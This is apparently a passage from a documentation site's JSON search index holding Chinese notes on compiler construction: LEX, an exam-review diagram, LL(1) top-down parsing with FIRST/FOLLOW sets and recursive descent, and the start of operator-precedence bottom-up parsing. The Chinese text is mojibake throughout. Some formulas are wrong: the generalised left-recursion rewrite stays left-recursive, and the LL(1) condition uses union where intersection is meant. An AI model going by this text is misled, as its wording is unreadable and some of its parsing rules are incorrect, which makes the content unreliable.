è¯æ³•åˆ†æè‡ªåŠ¨ç”Ÿæˆ LEX #  ç¼–è¯‘æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\nç®€å•ä½¿ç”¨ #  LEX å®˜æ–¹æ‰‹å†Œå¦‚ä¸‹ï¼šhttp://dinosaur.compilertools.net/lex/index.htmlã€‚ä»¥ä¸‹ä»‹ç»ç®€å•è§„èŒƒï¼š\n  LEX ç¼–å†™ä¸»è¦åˆ†ä¸º AUXILIARY DEFINITION ï¼ˆè¾…åŠ©å®šä¹‰ï¼‰å’Œ RECOGNITION RULES ï¼ˆè¯†åˆ«è§„åˆ™ï¼‰ä¸¤ä¸ªéƒ¨åˆ†\n  è¾…åŠ©å®šä¹‰ï¼šä»¥æ–‡æ³•å½¢å¼ç»™å¸¸ç”¨æ­£è§„å¼è¿›è¡Œå‘½åï¼Œæ¯”å¦‚ï¼šdigit-\u0026gt;1|2|3|4|5|6|7|8|9|0\n  è¯†åˆ«è§„åˆ™ï¼šéƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€ä¸ªæ­£è§„å¼å’Œä¸€å°æ®µç¨‹åºä»£ç ã€‚\n    å·¥ä½œæµç¨‹ #  LEX å·¥ä½œè¿‡ç¨‹ï¼š\n å¯¹äºæ¯ä¸€ä¸ªè¯†åˆ«è§„åˆ™ $$P_i$$ æ„é€ ä¸€ä¸ªå“åº”çš„éç¡®å®šæœ‰é™è‡ªåŠ¨æœº $$M_i$$ï¼› é€šè¿‡ä¸€ä¸ª $$\\epsilon$$ å¼§å°†è¿™äº›è‡ªåŠ¨æœºè¿æ¥æˆä¸€ä¸ªæ–°çš„ NFAï¼› æŠŠ NFA ç¡®å®šåŒ–ã€æœ€å°åŒ–ï¼Œç”Ÿæˆè¯¥ DFA çš„çŠ¶æ€è½¬æ¢è¡¨å’Œæ§åˆ¶æ‰§è¡Œç¨‹åºã€‚  "},{"id":371,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/review/","title":"Review","section":"2.è¯­æ³•åˆ†æ","content":" ç¼–è¯‘åŸç†æœŸæœ«è€ƒè¯•å¤ä¹ ï¼Œäº 2019-1-15\n REVIEW #  graph TB;\rTOPIC[è¯­æ³•åˆ†æ];\rTOPIC--\u0026gt;M1; TOPIC--\u0026gt;M2;\rsubgraph è‡ªä¸Šè€Œä¸‹\rM1[è‡ªä¸Šè€Œä¸‹]; WF1(\u0026#34;LL(1)æ–‡æ³•\u0026#34;); WF11(é€’å½’ä¸‹é™åˆ†æå™¨); WF12(é¢„æµ‹åˆ†æç¨‹åº);\rM1--\u0026gt;|1.ä¸å«å·¦é€’å½’\u0026lt;br\u0026gt;2.éç»ˆç»“ç¬¦ FIRST é›†ä¸ç›¸äº¤\u0026lt;br\u0026gt;3.ä¸€ä¸ªå…³äºepsilonæ—¶çš„çº¦æŸ|WF1\rWF1--\u0026gt;|ä¸€ä¸ªéç»ˆç»“ç¬¦\u0026lt;br\u0026gt;å¯¹åº”ä¸€ä¸ªå­ç¨‹åº|WF11;\rWF1--\u0026gt;|æ„é€ é¢„æµ‹åˆ†æè¡¨|WF12\rend\rsubgraph è‡ªä¸‹è€Œä¸Š\rM2[è‡ªä¸‹è€Œä¸Š]; WF2(ç®—ç¬¦ä¼˜å…ˆæ–‡æ³•); WF3(\u0026#34;LRåˆ†ææ³•\u0026#34;); WF31(\u0026#34;SLRåˆ†ææ³•\u0026lt;br\u0026gt;LR(0)é¡¹ç›®\u0026#34;); WF32(\u0026#34;è§„èŒƒLRåˆ†ææ³•\u0026lt;br\u0026gt;LR(1)é¡¹ç›®\u0026#34;); WF33(\u0026#34;LALRåˆ†ææ³•\u0026#34;)\rM2--\u0026gt;|\u0026#34;1.ç®—ç¬¦æ–‡æ³•:\u0026lt;br\u0026gt;ä¸å«ä¸¤ä¸ªç›¸ç»§çš„éç»ˆç»“ç¬¦\u0026lt;br\u0026gt;2.ç®—ç¬¦ä¼˜å…ˆæ–‡æ³•:\u0026lt;br\u0026gt;ç®—ç¬¦é—´å…³ç³»æ˜¯å”¯ä¸€çš„\u0026#34;|WF2\rM2--\u0026gt;|çŠ¶æ€\u0026lt;br\u0026gt;ACTION å­è¡¨\u0026lt;br\u0026gt;GOTO å­è¡¨|WF3\rWF3--\u0026gt;|1.æ— ç§»è¿›è§„çº¦å†²çª\u0026lt;br\u0026gt;2.ä¸å«å¤šä¸ªè§„çº¦é¡¹|WF31\rWF3--\u0026gt;|\u0026#34;é€šè¿‡å¤šè¯»ä¸€ä¸ªè¯\u0026lt;br\u0026gt;è§£å†³LR(0)å†²çª\u0026#34;|WF32\rWF3--\u0026gt;|\u0026#34;åˆå¹¶LR(1)é¡¹ç›®åŒå¿ƒé›†\u0026#34;|WF33\rend "},{"id":372,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B/","title":"è‡ªä¸Šè€Œä¸‹","section":"2.è¯­æ³•åˆ†æ","content":"è‡ªä¸Šè€Œä¸‹åˆ†æ Top-down #  ä»æ–‡æ³•çš„å¼€å§‹ç¬¦å·å¼€å§‹ï¼Œåå¤ä½¿ç”¨å„ç§äº§ç”Ÿå¼ï¼Œå¯»æ‰¾ â€œåŒ¹é…â€ çš„æ¨å¯¼ã€‚\n æ¨å¯¼ï¼šæ ¹æ®æ–‡æ³•çš„äº§ç”Ÿå¼è§„åˆ™ï¼ŒæŠŠä¸²ä¸­å‡ºç°çš„äº§ç”Ÿå¼çš„å·¦éƒ¨ç¬¦å·æ›¿æ¢æˆå³éƒ¨  ä»æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ„é€ è¯­æ³•æ ‘ã€‚\nç®—æ³•ï¼šé€’å½’ä¸‹é™æ³•ï¼Œé¢„æµ‹åˆ†æç¨‹åºã€‚\nåŸºæœ¬é—®é¢˜ #  é¢ä¸´çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜\n å½“é¢ä¸´å¤šä¸ªå€™é€‰å¼æ—¶çš„å›æº¯é—®é¢˜ã€‚ æ–‡æ³•çš„å·¦é€’å½’é—®é¢˜ã€‚  å·¦é€’å½’çš„æ¶ˆé™¤ #  ä¸€ä¸ªæ–‡æ³•æ¶ˆé™¤å·¦é€’å½’çš„æ¡ä»¶ï¼š\n ä¸å«ä»¥ $$\\epsilon$$ ä¸ºå³éƒ¨çš„å·¦äº§ç”Ÿå¼ ä¸å«å›è·¯ï¼Œå³ä¸å«æ¨å¯¼ $$P \\Rightarrow P$$  ç›´æ¥å·¦é€’å½’çš„æ¶ˆé™¤ï¼š\n äº§ç”Ÿå¼çš„ç›´æ¥å·¦é€’å½’ï¼š$$P \\rightarrow P\\alpha | \\beta, \\beta ä¸ä»¥ \\beta å¼€å¤´$$ è½¬å˜æˆå³é€’å½’æ–‡æ³•ï¼š  $$P \\rightarrow \\beta P\u0026rsquo;$$ $$P\u0026rsquo; \\rightarrow \\alpha P\u0026rsquo; | \\epsilon$$   æ¨å¹¿ï¼š$$P \\rightarrow P\\alpha_1 | P\\alpha_2 | \u0026hellip;| P\\alpha_m| \\beta_1 | \\beta_2 | \u0026hellip; | \\beta_n$$ï¼ˆæ¯ä¸ª $$\\alpha$$ éƒ½ä¸ç­‰äº $$\\epsilon$$ï¼Œæ¯ä¸ª $$\\beta$$ éƒ½ä¸ä»¥ P å¼€å¤´ï¼‰  $$P \\rightarrow \\beta_1 P\u0026rsquo; | \\beta_2 Pâ€˜ |\u0026hellip;|\\beta_n P\u0026rsquo;$$ $$P\u0026rsquo; \\rightarrow P\u0026rsquo; \\alpha_1 | P\u0026rsquo; \\alpha_2 | \u0026hellip; | P\u0026rsquo; \\alpha_m$$    é—´æ¥å·¦é€’å½’çš„æ¶ˆé™¤ï¼š\n ç®—æ³•ï¼š  æŠŠæ–‡æ³• G ä¸­çš„æ‰€æœ‰éç»ˆç»“ç¬¦æŒ‰ä»»æ„ä¸€ç§é¡ºåºæ’åˆ— $$P_1, P_2, \u0026hellip;, P_n$$ï¼›æŒ‰æ­¤é¡ºåºæ‰§è¡Œï¼š æŠŠ $$P_i$$ çš„è§„åˆ™æ”¹é€  æˆ $$P_i \\rightarrow a\u0026hellip;|P_{i+1}\u0026hellip;|P_{i+2}\u0026hellip;|\u0026hellip;|P_{i+k}\u0026hellip;$$ï¼Œå³ $$P_i$$ çš„æ¨å¯¼å¼ï¼Œåªèƒ½ä»¥ä¸‹æ ‡å¤§äº $$i$$ çš„å¼€å¤´ã€‚å¹¶æ¶ˆé™¤ $$P_i$$ çš„ç›´æ¥å·¦é€’å½’ã€‚ åŒ–ç®€ 2 æ‰€å¾—åˆ°çš„æ–‡æ³•ï¼Œå»é™¤ä»å¼€å§‹ç¬¦å·å‡ºå‘æ— æ³•åˆ°è¾¾çš„éç»ˆç»“ç¬¦çš„äº§ç”Ÿè§„åˆ™ã€‚    å›æº¯çš„æ¶ˆé™¤ #  å›æº¯æ¶ˆé™¤çš„ç»“æœï¼š\n å¯¹äºæ–‡æ³•çš„ä»»ä½•éç»ˆç»“ç¬¦ï¼Œå½“ä»–è¦å»åŒ¹é…è¾“å…¥ä¸²æ—¶ï¼Œèƒ½å¤Ÿæ ¹æ®å®ƒæ‰€é¢ä¸´çš„è¾“å…¥ç¬¦å·å‡†ç¡®åœ°æŒ‡æ´¾å®ƒçš„ä¸€ä¸ªå€™é€‰å»æ‰§è¡Œä»»åŠ¡ï¼Œå¹¶ä¸”æ­¤å€™é€‰çš„å·¥ä½œç»“æœåº”è¯¥æ˜¯ç¡®ä¿¡æ— ç–‘çš„ã€‚  å¼•å…¥æ¦‚å¿µï¼š\n FIRST é›†åˆï¼š  ä»¤ G æ˜¯ä¸€ä¸ªä¸å«å·¦é€’å½’çš„æ–‡æ³•ï¼Œå¯¹äº G ä¸­çš„æ¯ä¸ªéç»ˆç»“ç¬¦ $$\\alpha$$ å®šä¹‰å®ƒçš„ç»ˆç»“é¦–ç¬¦å·é›† $$FIRST(\\alpha)$$ ä¸ºï¼š  $$FISRT(\\alpha) = {a | \\alpha \\Rightarrow a\u0026hellip;, a \\in V_T}$$ ç‰¹åˆ«çš„ï¼Œè‹¥ $$\\alpha \\Rightarrow \\epsilon$$ï¼Œåˆ™è§„å®š $$\\epsilon \\in FIRST(\\alpha)$$   åˆ™ï¼šæ²¡æœ‰å›æº¯ $$\\Leftrightarrow$$ $$ A \\rightarrow \\alpha_i|\\alpha_j, FIRST(\\alpha_i) \\cap FIRST(\\alpha_j) = \\varnothing $$   FOLLOW é›†åˆï¼š  å‡å®š S æ˜¯æ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼Œå¯¹äº G çš„ä»»ä½•éç»ˆç»“ç¬¦ Aï¼Œæˆ‘ä»¬å®šä¹‰ A çš„ FOLLOW é›†åˆï¼š  $$FOLLOW(A) = {a | S \\Rightarrow \u0026hellip;Aa\u0026hellip;., a \\in V_T}$$ ç‰¹åˆ«çš„ï¼Œè‹¥ $$S \\Rightarrow \u0026hellip;A$$ï¼Œåˆ™è§„å®š $$ $ \\in FOLLOW(A) $$      ç®—æ³•ï¼š\n æå–å·¦å…¬å…±å› å­ï¼š  å‡å®š A çš„è§„åˆ™æ˜¯ï¼š$$A \\rightarrow \\delta \\beta_1 | \\delta \\beta_2 | \u0026hellip; | \\delta \\beta_n | \\gamma_1 | \\gamma_2 | \u0026hellip; | \\gamma_m$$ï¼ˆå…¶ä¸­æ¯ä¸ª $$\\gamma$$ éƒ½ä¸ä»¥ $$\\delta$$ å¼€å¤´ï¼‰ é‚£ä¹ˆå¯ä»¥å°†è¿™äº›è§„åˆ™æ”¹å†™æˆï¼š  $$A \\rightarrow \\delta A\u0026rsquo; | \\gamma_1 | \\gamma_2 | \u0026hellip; | \\gamma_m $$ $$A\u0026rsquo; \\rightarrow \\beta_1 | \\beta_2 | \u0026hellip; | \\beta_n$$      LL(1) æ–‡æ³• #  ä¸€ä¸ªæ–‡æ³• G æ»¡è¶³ä¸‹é¢æ¡ä»¶ï¼Œç§°ä½œè¯¥æ–‡æ³• G ä¸º LL(1) æ–‡æ³•ã€‚\n æ–‡æ³•ä¸å«å·¦é€’å½’ å¯¹äºæ–‡æ³•ä¸­æ¯ä¸€ä¸ªéç»ˆç»“ç¬¦ A çš„å„ä¸ªäº§ç”Ÿå¼çš„å€™é€‰é¦–ç¬¦é›†ä¸¤ä¸¤ä¸ç›¸äº¤ã€‚  å³ï¼š$$ A \\rightarrow \\alpha_i|\\alpha_j, FIRST(\\alpha_i) \\cap FIRST(\\alpha_j) = \\varnothing $$   å¯¹æ–‡æ³•ä¸­çš„æ¯ä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œè‹¥å­˜åœ¨æŸä¸ªå€™é€‰é¦–ç¬¦é›†åŒ…å« $$\\epsilon$$ï¼Œåˆ™ï¼š$$FIRST(\\alpha_i) \\cup FOLLOW(A) = \\varnothing, i=1,2,\u0026hellip;,n$$  å…¶ä¸­ç¬¬ä¸€ä¸ª L è¡¨ç¤ºä»å·¦åˆ°å³æ‰«æè¾“å…¥ä¸²ï¼Œç¬¬äºŒä¸ª L è¡¨ç¤ºåˆ†æè¿‡ç¨‹æ˜¯ä¸€ä¸ªæœ€å·¦æ¨å¯¼ï¼Œ1 è¡¨ç¤ºæ¯æ¬¡åªéœ€å‰è¿›ä¸€ä¸ªç¬¦å·ã€‚\nLL(1) åˆ†ææ³• #  å¯¹äºLL(1) æ–‡æ³•ï¼Œå¯ä»¥å¯¹å…¶è¾“å…¥ä¸²è¿›è¡Œæœ‰æ•ˆçš„æ— å›æº¯è‡ªä¸Šè€Œä¸‹åˆ†æï¼š\n å‡è®¾è¦ç”¨éç»ˆç»“ç¬¦ A è¿›è¡ŒåŒ¹é…ï¼Œé¢ä¸´çš„è¾“å…¥ç¬¦å·ä¸º aï¼ŒA çš„æ‰€æœ‰äº§ç”Ÿå¼ä¸ºï¼š$$A \\rightarrow \\alpha_1 | \\alpha_2 | \u0026hellip; | \\alpha_n$$  è‹¥ $$a \\in FIRST(\\alpha_i)$$ï¼Œåˆ™æŒ‡æ´¾ $$\\alpha_i$$ æ‰§è¡ŒåŒ¹é…ä»»åŠ¡ï¼› è‹¥ $$\\forall i, a \\notin FIRST(\\alpha_i). \\exist i, \\epsilon \\in FIRST(\\alpha_i) ä¸” a \\in FOLLOW(\\alpha_i)$$ï¼Œåˆ™è®© A ä¸ $$\\epsilon$$ è‡ªåŠ¨åŒ¹é…ã€‚ å¦åˆ™ï¼Œa çš„å‡ºç°æ˜¯ä¸€ç§è¯­æ³•é”™è¯¯ã€‚    FIRST å’Œ FOLLOW é›† #  $$FISRT(\\alpha) = {a | \\alpha \\Rightarrow a\u0026hellip;, a \\in V_T}$$\næ„é€  $$FIRST(\\alpha)$$ï¼š\n å¯¹äº $$\\alpha = X, X \\in V_T \\cup V_N$$  å¯¹äºæ¯ä¸€ä¸ª $$X \\in V_T \\cup V_N$$ï¼Œè¿ç»­ä½¿ç”¨ä¸‹é¢è§„åˆ™ï¼Œç›´è‡³ FIRST é›†åˆä¸å†å¢å¤§ä¸ºæ­¢ï¼š  è‹¥ $$X \\in V_T$$ï¼Œåˆ™ $$FIRST(X) = {X}$$ è‹¥ $$X \\in V_N, \\exist X \\rightarrow a\u0026hellip;, a \\in V_T$$ï¼Œåˆ™ $$FIRST(X) += {a}$$ è‹¥ $$ \\exist X \\rightarrow Y_1Y_2..Yi\u0026hellip;Y_k $$ï¼Œå…¶ä¸­ $$Y_1, Y_2,\u0026hellip;, Y_{i-1}$$ éƒ½æ˜¯éç»ˆç»“ç¬¦  è‹¥ $$\\forall j, 1 \\le j \\le i-1, \\epsilon \\in FIRST(Y_j)$$ï¼Œåˆ™ $$FIRST(X) += FIRST(Y_i) - {\\epsilon}$$ è‹¥ $$\\forall j, 1 \\le j \\le k, \\epsilon \\in FIRST(Y_j)$$ï¼Œåˆ™ $$FIRST(X) += {\\epsilon}$$     NOTICEï¼šä»»ä½•ä¸€ä¸ªç¬¦å·çš„ FIRST é›†åˆå‘ç”Ÿäº†å˜åŒ–ï¼Œéƒ½è¦é‡æ–°å¼€å§‹æ‰«æã€‚ç›´åˆ°ä¸€æ¬¡æ‰«æè¿‡ç¨‹ä¸­ï¼ŒFIRST é›†åˆæ²¡æœ‰ä»»ä½•å‘ç”Ÿå˜åŒ–ã€‚   å¯¹äº $$\\alpha = X_1 X_2 \u0026hellip; X_n$$  ç½® $$FIRST(\\alpha) = FIRST(X_1) - {\\epsilon}$$ è‹¥ $$\\forall j, 1 \\le j \\le i-1, \\epsilon \\in FIRST(X_j)$$ï¼Œåˆ™ $$FIRST(X) += FIRST(X_i) - {\\epsilon}$$ è‹¥ $$\\forall j, 1 \\le j \\le k, \\epsilon \\in FIRST(X_j)$$ï¼Œåˆ™ $$FIRST(X) += {\\epsilon}$$    $$FOLLOW(A) = {a | S \\Rightarrow \u0026hellip;Aa\u0026hellip;., a \\in V_T}$$\næ„é€  $$FOLLOW(\\alpha)$$ ï¼š\n è¿ç»­ä½¿ç”¨ä¸‹é¢çš„è§„åˆ™ï¼Œç›´åˆ° FOLLOW ä¸å†å¢å¤§ä¸ºæ­¢ï¼š  å¯¹äºæ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼Œç½® $$ $ $$ äº FOLLOW(S) ä¸­ï¼› è‹¥ $$\\exist A \\rightarrow \\alpha B \\beta, FOLLOW(B) += FIRST(\\beta)-{\\epsilon}$$ è‹¥ $$(\\exist A \\rightarrow \\alpha B) \\or (\\exist A \\rightarrow \\alpha B \\beta \\and \\epsilon \\in FIRST(\\beta))$$ï¼Œåˆ™ $$FOLLOW(B) += FOLLOW(A)$$    é€’å½’ä¸‹é™åˆ†æå™¨ #  åˆ†æç¨‹åºç”±ä¸€ç»„å­ç¨‹åºç»„æˆï¼Œå¯¹æ¯ä¸€ä¸ªè¯­æ³•å•ä½æ„é€ ä¸€ä¸ªç›¸åº”çš„å­ç¨‹åºï¼Œè¯†åˆ«å¯¹åº”çš„è¯­æ³•å•ä½ã€‚é€šè¿‡å­ç¨‹åºé—´çš„ç›¸äº’è°ƒç”¨å®ç°å¯¹è¾“å…¥ä¸²çš„è¯†åˆ«ã€‚\nå®šä¹‰å…¨å±€è¿‡ç¨‹å’Œå˜é‡ï¼š\n ADVANCEï¼šæŠŠè¾“å…¥ä¸²æŒ‡ç¤ºå™¨ IPï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªè¾“å…¥ç¬¦å·ï¼Œå³è¯»å…¥ä¸€ä¸ªå•è¯ç¬¦å· ERRORï¼šå‡ºé”™å¤„ç†å­ç¨‹åº SYMï¼šIP å½“å‰æ‰€æŒ‡å‘çš„è¾“å…¥ç¬¦å·  å­ç¨‹åºè®¾è®¡ï¼šæ¯ä¸ªéç»ˆç»“ç¬¦éƒ½æœ‰å¯¹åº”çš„å­ç¨‹åºå®šä¹‰ï¼Œåœ¨åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œå½“éœ€è¦ä»æŸä¸ªéç»ˆç»“ç¬¦å‡ºå‘è¿›è¡Œå±•å¼€ï¼ˆæ¨å¯¼ï¼‰æ—¶ï¼Œå°±è°ƒç”¨è¿™ä¸ªéç»ˆç»“ç¬¦å¯¹åº”çš„å­ç¨‹åºã€‚\nä»¥ $$A \\rightarrow TE | BC | \\epsilon $$ ä¸ºä¾‹ï¼Œå…¶é€’å½’ä¸‹é™å­ç¨‹åºä¸ºï¼š\nPROCEDURE A;\rBEGIN\rif SYM in FIRST(TE) then\rBEGIN T; E; END\relse if SYM in FIRST(BC) then\rBEGIN B; C; END\relse if SYM not in FOLLOW(A) then\rERROR\rEND; PostScript: æ‰©å……å·´ç§‘æ–¯èŒƒå¼ã€‚\nåœ¨å…ƒç¬¦å· $$\\rightarrow$$ æˆ– ::= å’Œ | çš„åŸºç¡€ä¸Šï¼Œæ‰©å……ä»¥ä¸‹å‡ ä¸ªå…ƒè¯­è¨€ç¬¦å·ï¼š\n ç”¨ $${\\alpha}$$ è¡¨ç¤ºé—­åŒ…è¿ç®— $$a^*$$ï¼› ç”¨ $${\\alpha}_0^n$$ è¡¨ç¤ºå¯ä»»æ„é‡å¤ 0 æ¬¡åˆ° n æ¬¡ï¼› $$[\\alpha] \\Leftrightarrow {\\alpha}_0^1 \\Leftrightarrow \\alpha | \\epsilon$$  JavaCC å·¥ä½œæµç¨‹å…¥ä¸‹ï¼š\né¢„æµ‹åˆ†æç¨‹åº #  åˆ†ææµç¨‹ #  é¢„æµ‹åˆ†æç¨‹åºçš„æ„æˆï¼š\n æ€»æ§ç¨‹åºï¼šæ ¹æ®ç°è¡Œæ ˆé¡¶ç¬¦å·å’Œå½“å‰è¾“å…¥ç¬¦å·ï¼Œæ‰§è¡ŒåŠ¨ä½œ åˆ†æè¡¨ $$M[A, a]$$ çŸ©é˜µï¼š$$A \\in V_N, a \\in V_T \\cap {end}$$ åˆ†ææ ˆ STACKï¼šç”¨äºå­˜æ”¾æ–‡æ³•ç¬¦å·  é¢„æµ‹åˆ†æè¿‡ç¨‹ï¼šæ€»æ§ç¨‹åºæ ¹æ®å½“å‰æ ˆé¡¶ç¬¦å· X å’Œè¾“å…¥ç¬¦å· aï¼Œæ‰§è¡Œä¸‹åˆ—ä¸‰ä¸ªåŠ¨ä½œä¹‹ä¸€ï¼š\n è‹¥ $$X = a = end â€‹$$ï¼Œåˆ™å®£å¸ƒåˆ†ææˆåŠŸï¼Œåœæ­¢åˆ†æï¼› è‹¥ $$X = a \\neq end $$ï¼Œåˆ™æŠŠ X ä» STACK æ ˆé¡¶å–å‡ºï¼Œè®© a æŒ‡å‘ä¸‹ä¸€ä¸ªè¾“å…¥ç¬¦å·ï¼› è‹¥ $$X \\neq a $$ ä¸” X æ˜¯ä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œåˆ™æŸ¥çœ‹åˆ†æè¡¨ Mï¼š  è‹¥ $$M[X, a]$$ ä¸­å­˜æ”¾ç€å…³äº X çš„ä¸€ä¸ªäº§ç”Ÿå¼ï¼ŒæŠŠ X å‡ºæ ˆï¼ŒæŠŠäº§ç”Ÿå¼çš„å³éƒ¨ç¬¦å·ä¸²æŒ‰ååºæ¨è¿› STACK æ ˆä¸­ï¼› è‹¥ $$M[X, a]$$ ä¸­æœªå­˜æ”¾ä»»ä½•æ ‡è®°æˆ– â€œå‡ºé”™æ ‡å¿—â€ çš„è¯ï¼Œåˆ™è°ƒç”¨å‡ºå‘è¯Šå¯Ÿç¨‹åº ERRORã€‚   è‹¥ $$X \\neq a$$ ä¸” X æ˜¯ä¸€ä¸ªç»ˆç»“ç¬¦ï¼Œåˆ™è°ƒç”¨é”™è¯¯è¯Šå¯Ÿç¨‹åº ERRORã€‚  åˆ†æè¡¨çš„æ„é€  #  é¦–å…ˆéœ€è¦è®¡ç®—æ¯ä¸ªéç»ˆç»“ç¬¦ X çš„ $$FIRST(X)$$ å’Œ $$FOLLOW(X)$$ é›†åˆã€‚\næ„é€  G çš„åˆ†æè¡¨ $$M[A, a]$$ï¼Œå³ç¡®å®šæ¯ä¸ªäº§ç”Ÿå¼ $$A \\rightarrow \\alpha$$ åœ¨è¡¨ä¸­çš„ä½ç½®ï¼š\n å¯¹æ–‡æ³• G çš„æ¯ä¸ªäº§ç”Ÿå¼æ‰§è¡Œç¬¬ 2 æ­¥å’Œç¬¬ 3 æ­¥ï¼š $$\\forall a \\in FIRST(\\alpha), M[A,a] = \u0026ldquo;A \\rightarrow \\alpha\u0026rdquo;$$ è‹¥ $$\\epsilon \\in FIRST(\\alpha)$$ï¼Œåˆ™ $$\\forall b \\in FOLLOW(A), M[A,b] = A \\rightarrow \\alpha$$  å¯ä»¥è¯æ˜ï¼šä¸€ä¸ªæ–‡æ³• G çš„é¢„æµ‹åˆ†æè¡¨ M ä¸å«å¤šé‡å®šä¹‰å…¥å£ $$\\Leftrightarrow$$ è¯¥æ–‡æ³•ä¸º LL(1) çš„ $$\\Leftrightarrow$$ è¯¥æ–‡æ³•æ— äºŒä¹‰æ€§ã€‚\nPostScriptï¼šå°½ç®¡æ„é€ çš„æ–‡æ³•å¯èƒ½æ˜¯äºŒä¹‰çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ‰‹åŠ¨æ¶ˆé™¤çš„æ–¹å¼å–æ¶ˆäºŒä¹‰æ€§ï¼Œæ¯”å¦‚ï¼šif stat else if stat else stat\n"},{"id":373,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A/","title":"è‡ªä¸‹è€Œä¸Š","section":"2.è¯­æ³•åˆ†æ","content":"è‡ªä¸‹è€Œä¸Š Bottom-up #  ä»è¾“å…¥ä¸²å¼€å§‹ï¼Œé€æ­¥è¿›è¡Œå½’çº¦ï¼Œç›´åˆ°æ–‡æ³•çš„å¼€å§‹ç¬¦å·ã€‚\n è§„çº¦ï¼šæ ¹æ®æ–‡æ³•çš„äº§ç”Ÿå¼è§„åˆ™ï¼ŒæŠŠä¸²ä¸­å‡ºç°çš„äº§ç”Ÿå¼å³éƒ¨æ›¿æ¢æˆå·¦éƒ¨ç¬¦å·ï¼›  ä»æ ‘çš„å¶èŠ‚ç‚¹å¼€å§‹ï¼Œæ„é€ è¯­æ³•æ ‘ã€‚\nç®—æ³•ï¼šç®—ç¬¦ä¼˜å…ˆåˆ†ææ³•ï¼ŒLR åˆ†ææ³•ã€‚\nç®€è¿°æ¦‚å¿µ #  åŸºæœ¬æ€æƒ³ï¼š\n é‡‡ç”¨ â€œç§»è¿›-è§„çº¦â€ æ€æƒ³è¿›è¡Œè‡ªä¸‹è€Œä¸Šåˆ†æ ç”¨ä¸€ä¸ªå¯„å­˜ç¬¦å·çš„å…ˆè¿›åå‡ºæ ˆï¼ŒæŠŠè¾“å…¥ç¬¦å·ä¸€ä¸ªä¸€ä¸ªåœ°ç§»è¿›æ ˆé‡Œï¼Œå½“æ ˆé¡¶å½¢æˆæŸä¸ªäº§ç”Ÿå¼çš„å€™é€‰å¼æ—¶ï¼Œå³æŠŠæ ˆé¡¶çš„è¿™ä¸€éƒ¨åˆ†æ›¿æ¢ä¸ºï¼ˆè§„çº¦ï¼‰è¯¥äº§ç”Ÿå¼çš„å·¦éƒ¨  æ ¸å¿ƒé—®é¢˜ï¼šè¯†åˆ«å¯å½’çº¦ä¸²ã€‚\nçŸ­è¯­ï¼š\n ä»¤ G æ˜¯ä¸€ä¸ªæ–‡æ³•ï¼ŒS æ˜¯æ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼Œå‡è®¾ $$\\alpha \\beta \\delta$$ æ˜¯æ–‡æ³• G çš„ä¸€ä¸ªå¥å‹ï¼Œå¦‚æœæœ‰ $$S \\overset{*}{\\Rightarrow} \\alpha A \\delta ä¸” A \\overset{+}{\\Rightarrow} \\beta$$ï¼Œåˆ™ $$\\beta$$ ç§°æ˜¯å¥å‹ $$\\alpha \\beta \\delta$$ ç›¸å¯¹äºéç»ˆç»“ç¬¦ A çš„çŸ­è¯­ã€‚ å¦‚æœæœ‰ $$A \\Rightarrow \\beta$$ï¼Œåˆ™ç§° $$\\beta$$ æ˜¯å¥å‹ $$\\alpha \\beta \\delta$$ ç›¸å¯¹äºè§„åˆ™ $$A \\rightarrow \\beta$$ çš„ç›´æ¥çŸ­è¯­ã€‚ ä¸€ä¸ªå¥å‹çš„æœ€å·¦ç›´æ¥çŸ­è¯­ç§°ä¸ºè¯¥å¥å‹çš„å¥æŸ„ã€‚  åˆ†æè¿‡ç¨‹æè¿°ï¼šå¯ä»¥ç”¨ æ­¥éª¤ã€ç¬¦å·æ ˆã€è¾“å…¥ä¸²ã€æ‰€ç”¨äº§ç”Ÿå¼ å››å…ƒç»„æ¥æè¿°ã€‚\nç®—ç¬¦ä¼˜å…ˆæ³• #  å®šä¹‰ #  ä¼˜å…ˆå…³ç³»ï¼š\n ä»»ä½•ä¸¤ä¸ªå¯èƒ½ç›¸ç»§å‡ºç°çš„ç»ˆç»“ç¬¦çš„ç»ˆç»“ç¬¦ a ä¸ b å¯èƒ½ä¸‰ç§ä¼˜å…ˆå…³ç³»ï¼š  $$a \\lessdot b$$ï¼Œa çš„ä¼˜å…ˆçº§ä½äº b $$a \\doteq b$$ï¼Œa çš„è¿ç®—çº§ç­‰äº b $$a \\gtrdot b$$ï¼Œa çš„è¿ç®—çº§é«˜äº b   ç®—ç¬¦ä¼˜å…ˆå…³ç³»ä¸æ•°å­¦ä¸Šçš„ \u0026lt; \u0026gt; = ä¸åŒï¼š  $$+ \\lessdot + $$ â†’ å³è¾¹çš„åŠ å·æ¯”å·¦è¾¹çš„åŠ å·ä¼˜å…ˆçº§é«˜ï¼Œå³ç®—æœ¯å³ç»“åˆ $$a \\lessdot b$$ å¹¶ä¸æ„å‘³ç€ $$b \\gtrdot a$$    ç®—ç¬¦æ–‡æ³•ï¼š\n 